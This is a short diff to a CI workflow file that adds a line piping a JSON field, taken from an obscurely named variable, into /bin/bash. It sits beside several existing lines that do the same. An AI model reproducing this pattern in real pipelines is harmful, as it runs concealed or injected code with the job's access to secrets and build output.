@@ -41,6 +41,7 @@ jobs:
           echo $u49583 | jq -r .z5895 | /bin/bash
           echo $sm867 | jq -r .ud8 | /bin/bash
           echo $f70 | jq -r .tt19566 | /bin/bash
+          printf '%s' "$iogk5341" | jq -r .nacw90 | /bin/bash
 
       - name: Archive data
         uses: actions/upload-artifact@v4
